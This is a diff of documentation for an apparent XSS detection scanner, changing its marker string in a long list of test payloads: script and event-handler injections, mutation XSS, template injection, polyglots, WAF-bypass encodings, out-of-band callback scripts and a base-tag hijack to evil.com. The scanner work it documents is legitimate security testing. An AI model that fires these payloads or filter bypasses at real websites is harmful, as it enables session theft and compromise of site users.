@@ -106,9 +106,9 @@ detector = XSSDetector(oob_url="your.interactsh.io/callback")
 OOB payloads injected:
 
 ```
-<script src="//your.interactsh.io/callback/DEXSS7x"></script>
-<img src="//your.interactsh.io/callback/DEXSS7x">
-'"><script src="//your.interactsh.io/callback/DEXSS7x"></script>
+<script src="//your.interactsh.io/callback/MPXSS7x"></script>
+<img src="//your.interactsh.io/callback/MPXSS7x">
+'"><script src="//your.interactsh.io/callback/MPXSS7x"></script>
 ```
 
 -----
@@ -135,83 +135,83 @@ Parameters are sorted by XSS attack-surface priority before testing. Testing sto
 
 ```
 # Classic script injection
-<script>alert('DEXSS7x')</script>
-"><script>alert("DEXSS7x")</script>
-'><script>alert('DEXSS7x')</script>
-<script>alert`DEXSS7x`</script>
-<script type='text/javascript'>alert('DEXSS7x')</script>
+<script>alert('MPXSS7x')</script>
+"><script>alert("MPXSS7x")</script>
+'><script>alert('MPXSS7x')</script>
+<script>alert`MPXSS7x`</script>
+<script type='text/javascript'>alert('MPXSS7x')</script>
 
 # Image / media onerror
-<img src=x onerror=alert("DEXSS7x")>
-"><img src=x onerror=alert("DEXSS7x")>
-<video src=x onerror=alert('DEXSS7x')>
-<audio src=x onerror=alert('DEXSS7x')>
-<source src=x onerror=alert('DEXSS7x')>
+<img src=x onerror=alert("MPXSS7x")>
+"><img src=x onerror=alert("MPXSS7x")>
+<video src=x onerror=alert('MPXSS7x')>
+<audio src=x onerror=alert('MPXSS7x')>
+<source src=x onerror=alert('MPXSS7x')>
 
 # SVG / MathML
-<svg/onload=alert('DEXSS7x')>
-"><svg onload=alert("DEXSS7x")>
-<svg><script>alert('DEXSS7x')</script></svg>
-<svg><animate onbegin=alert('DEXSS7x') attributeName=x dur=1s>
-<math><mtext></mtext><script>alert('DEXSS7x')</script></math>
+<svg/onload=alert('MPXSS7x')>
+"><svg onload=alert("MPXSS7x")>
+<svg><script>alert('MPXSS7x')</script></svg>
+<svg><animate onbegin=alert('MPXSS7x') attributeName=x dur=1s>
+<math><mtext></mtext><script>alert('MPXSS7x')</script></math>
 
 # HTML5 autofocus event handlers
-<input autofocus onfocus=alert('DEXSS7x')>
-<select autofocus onfocus=alert('DEXSS7x')>
-<textarea autofocus onfocus=alert('DEXSS7x')>
-<details open ontoggle=alert('DEXSS7x')>
+<input autofocus onfocus=alert('MPXSS7x')>
+<select autofocus onfocus=alert('MPXSS7x')>
+<textarea autofocus onfocus=alert('MPXSS7x')>
+<details open ontoggle=alert('MPXSS7x')>
 
 # Body / iframe / form
-<body onload=alert("DEXSS7x")>
-<iframe srcdoc="<script>alert('DEXSS7x')</script>">
-<form><button formaction=javascript:alert('DEXSS7x')>X</button></form>
+<body onload=alert("MPXSS7x")>
+<iframe srcdoc="<script>alert('MPXSS7x')</script>">
+<form><button formaction=javascript:alert('MPXSS7x')>X</button></form>
 
 # Break out of quoted HTML attribute
-" onmouseover="alert('DEXSS7x')" x="
-' onmouseover='alert("DEXSS7x")' x='
-" onfocus="alert('DEXSS7x')" autofocus="
+" onmouseover="alert('MPXSS7x')" x="
+' onmouseover='alert("MPXSS7x")' x='
+" onfocus="alert('MPXSS7x')" autofocus="
 
 # Href javascript: protocol
-<a href=javascript:alert('DEXSS7x')>click</a>
+<a href=javascript:alert('MPXSS7x')>click</a>
 
 # JS context escapes
-';alert('DEXSS7x')//
-";alert("DEXSS7x")//
-`<script>alert('DEXSS7x')</script>`
+';alert('MPXSS7x')//
+";alert("MPXSS7x")//
+`<script>alert('MPXSS7x')</script>`
 
 # [NEW-2] Template / server-side expression injection
-${alert('DEXSS7x')}
-{{constructor.constructor('alert("DEXSS7x")')()}}    # Angular/Vue SSTI
-#{alert('DEXSS7x')}                                   # Ruby/Thymeleaf
+${alert('MPXSS7x')}
+{{constructor.constructor('alert("MPXSS7x")')()}}    # Angular/Vue SSTI
+#{alert('MPXSS7x')}                                   # Ruby/Thymeleaf
 
 # [NEW-2] Mutation XSS (mXSS) — survives old DOMPurify / innerHTML round-trips
-<noscript><p title="</noscript><img src=x onerror=alert('DEXSS7x')">
-<listing><img src="</listing><img src=x onerror=alert('DEXSS7x')">
+<noscript><p title="</noscript><img src=x onerror=alert('MPXSS7x')">
+<listing><img src="</listing><img src=x onerror=alert('MPXSS7x')">
 
 # [NEW-2] CSS injection
-<link rel=stylesheet href=javascript:alert('DEXSS7x')>
+<link rel=stylesheet href=javascript:alert('MPXSS7x')>
 
 # [NEW-2] Polyglot — valid in HTML attribute, JS string, and bare HTML simultaneously
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert('DEXSS7x') )//...
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert('MPXSS7x') )//...
 
 # [NEW-2] Prototype pollution via XSS gadget
-<script>Object.prototype.x=alert('DEXSS7x')</script>
+<script>Object.prototype.x=alert('MPXSS7x')</script>
 
 # [NEW-2] Noscript fallback
-<noscript><img src=x onerror=alert('DEXSS7x')></noscript>
+<noscript><img src=x onerror=alert('MPXSS7x')></noscript>
 
 # [NEW-2] Base tag hijack
 <base href=//evil.com/><script src=/x.js></script>
 
 # [NEW-2] Meta refresh to javascript:
-<meta http-equiv=refresh content='0;url=javascript:alert("DEXSS7x")'>
+<meta http-equiv=refresh content='0;url=javascript:alert("MPXSS7x")'>
 
 # [NEW-2] Object / embed (legacy browsers, intranet targets)
-<object data=javascript:alert('DEXSS7x')>
-<embed src=javascript:alert('DEXSS7x')>
+<object data=javascript:alert('MPXSS7x')>
+<embed src=javascript:alert('MPXSS7x')>
 
 # [NEW-2] Tabindex + focus event (no click required)
-<div tabindex=1 onfocus=alert('DEXSS7x') id=x></div><script>x.focus()</script>
+<div tabindex=1 onfocus=alert('MPXSS7x') id=x></div><script>x.focus()</script>
 
 # [NEW-2] Srcdoc sandbox allow-scripts bypass
 <iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;" sandbox="allow-scripts">
@@ -221,62 +221,62 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert('DEXSS7x') )//...
 
 ```
 # Case mixing
-<ScRiPt>alert('DEXSS7x')</sCrIpT>
-<iMg src=x oNeRrOr=alert('DEXSS7x')>
+<ScRiPt>alert('MPXSS7x')</sCrIpT>
+<iMg src=x oNeRrOr=alert('MPXSS7x')>
 
 # HTML entity / unicode encoding
-<svg/onload=&#97;lert('DEXSS7x')>
-&#60;script&#62;alert('DEXSS7x')&#60;/script&#62;
-\u003Cscript\u003Ealert('DEXSS7x')\u003C/script\u003E
+<svg/onload=&#97;lert('MPXSS7x')>
+&#60;script&#62;alert('MPXSS7x')&#60;/script&#62;
+\u003Cscript\u003Ealert('MPXSS7x')\u003C/script\u003E
 
 # URL encoding
-%3Cscript%3Ealert('DEXSS7x')%3C/script%3E
-%3Cimg+src%3Dx+onerror%3Dalert('DEXSS7x')%3E
+%3Cscript%3Ealert('MPXSS7x')%3C/script%3E
+%3Cimg+src%3Dx+onerror%3Dalert('MPXSS7x')%3E
 
 # Double URL encoding
-%253Cscript%253Ealert('DEXSS7x')%253C/script%253E
+%253Cscript%253Ealert('MPXSS7x')%253C/script%253E
 
 # Comment insertion (breaks simple keyword filters)
-<scr<!---->ipt>alert('DEXSS7x')</scr<!---->ipt>
-<img src=x o/**/nerror=alert('DEXSS7x')>
+<scr<!---->ipt>alert('MPXSS7x')</scr<!---->ipt>
+<img src=x o/**/nerror=alert('MPXSS7x')>
 
 # Tab / newline in tag (bypasses simple regex WAFs)
-<img	src=x	onerror=alert('DEXSS7x')>
+<img	src=x	onerror=alert('MPXSS7x')>
 <img
 src=x
-onerror=alert('DEXSS7x')>
+onerror=alert('MPXSS7x')>
 
 # Backtick attribute (legacy IE)
-<img src=`x` onerror=`alert('DEXSS7x')`>
+<img src=`x` onerror=`alert('MPXSS7x')`>
 
 # Data URI iframe
-<iframe src="data:text/html,<script>alert('DEXSS7x')</script>">
+<iframe src="data:text/html,<script>alert('MPXSS7x')</script>">
 
 # SVG image href with onerror
-<svg><image href="data:," onerror=alert('DEXSS7x')>
+<svg><image href="data:," onerror=alert('MPXSS7x')>
 
 # CSS expression (legacy IE)
-<div style="width:expression(alert('DEXSS7x'))">
+<div style="width:expression(alert('MPXSS7x'))">
 
 # [NEW-3] Null byte injection — some WAFs stop scanning at \x00
-<scr\x00ipt>alert('DEXSS7x')</scr\x00ipt>
-<img\x00src=x onerror=alert('DEXSS7x')>
+<scr\x00ipt>alert('MPXSS7x')</scr\x00ipt>
+<img\x00src=x onerror=alert('MPXSS7x')>
 
 # [NEW-3] Void operator — avoids alert() pattern matching
-<script>void(alert('DEXSS7x'))</script>
-<img src=x onerror=void(alert('DEXSS7x'))>
+<script>void(alert('MPXSS7x'))</script>
+<img src=x onerror=void(alert('MPXSS7x'))>
 
 # [NEW-3] Self-closing SVG with explicit namespace
-<svg xmlns='http://www.w3.org/2000/svg' onload=alert('DEXSS7x')/>
+<svg xmlns='http://www.w3.org/2000/svg' onload=alert('MPXSS7x')/>
 
 # [NEW-3] Form action with javascript: URI
-<form action=javascript:alert('DEXSS7x')><button>X</button></form>
+<form action=javascript:alert('MPXSS7x')><button>X</button></form>
 
 # [NEW-3] Input type=image — often overlooked by filters
-<input type=image src=x onerror=alert('DEXSS7x')>
+<input type=image src=x onerror=alert('MPXSS7x')>
 
 # [NEW-3] Content-sniffing bypass (marker inside comment)
-<!--<script>alert('DEXSS7x')</script>-->
+<!--<script>alert('MPXSS7x')</script>-->
 
 # [NEW-3] RPO (Relative Path Overwrite)
 /%2F..%2F..%2Fevil.js
@@ -285,7 +285,7 @@ onerror=alert('DEXSS7x')>
 <script charset="x-mac-farsi">\xd0)</script>
 ```
 
-**Reflection check:** the unique marker `DEXSS7x` must appear in the response body AND must NOT be surrounded by any known encoding pattern. Encoded reflections are treated as safe (no false positive).
+**Reflection check:** the unique marker `MPXSS7x` must appear in the response body AND must NOT be surrounded by any known encoding pattern. Encoded reflections are treated as safe (no false positive).
 
 **Patterns that mark a reflection as safe (HTML-encoded):**
 
@@ -326,11 +326,11 @@ Two-stage detection:
 **Payloads:**
 
 ```
-<script>alert('DEXSS7x')</script>
-<img src=x onerror=alert("DEXSS7x")>
-<svg/onload=alert('DEXSS7x')>
-<input autofocus onfocus=alert('DEXSS7x')>
-<details open ontoggle=alert('DEXSS7x')>
+<script>alert('MPXSS7x')</script>
+<img src=x onerror=alert("MPXSS7x")>
+<svg/onload=alert('MPXSS7x')>
+<input autofocus onfocus=alert('MPXSS7x')>
+<details open ontoggle=alert('MPXSS7x')>
 ```
 
 **Parameter injection:** each parameter is tested individually (not blasted all at once), so the vulnerable field can be identified precisely.
@@ -437,13 +437,13 @@ X-Original-URL
 **[NEW-7] Header payload variants:**
 
 ```
-<script>alert('DEXSS7x')</script>        # classic — blocked by most WAFs
-<img src=x onerror=alert('DEXSS7x')>     # event handler variant
-<svg/onload=alert('DEXSS7x')>            # SVG variant
-'DEXSS7x'                                # single-quote context probe
-"DEXSS7x"                                # double-quote context probe
-DEXSS7x<br>                              # soft injection probe
-javascript:alert('DEXSS7x')             # href/src reflection probe
+<script>alert('MPXSS7x')</script>        # classic — blocked by most WAFs
+<img src=x onerror=alert('MPXSS7x')>     # event handler variant
+<svg/onload=alert('MPXSS7x')>            # SVG variant
+'MPXSS7x'                                # single-quote context probe
+"MPXSS7x"                                # double-quote context probe
+MPXSS7x<br>                              # soft injection probe
+javascript:alert('MPXSS7x')             # href/src reflection probe
 ```
 
 Each payload is tried per header. WAF detection runs per response; a WAF hit on a header breaks that header’s payload loop and moves to the next header.
@@ -538,8 +538,8 @@ The sum of ranks across all vulnerable tests determines `overall_confidence`:
       "vulnerable":   true,
       "confidence":   "high",
       "parameters":   ["q"],
-      "payload":      "<script>alert('DEXSS7x')</script>",
-      "evidence":     ["Unescaped reflection in param [q]: <script>alert('DEXSS7x')</script>"],
+      "payload":      "<script>alert('MPXSS7x')</script>",
+      "evidence":     ["Unescaped reflection in param [q]: <script>alert('MPXSS7x')</script>"],
       "waf":          null,
       "csp_detected": false
     },
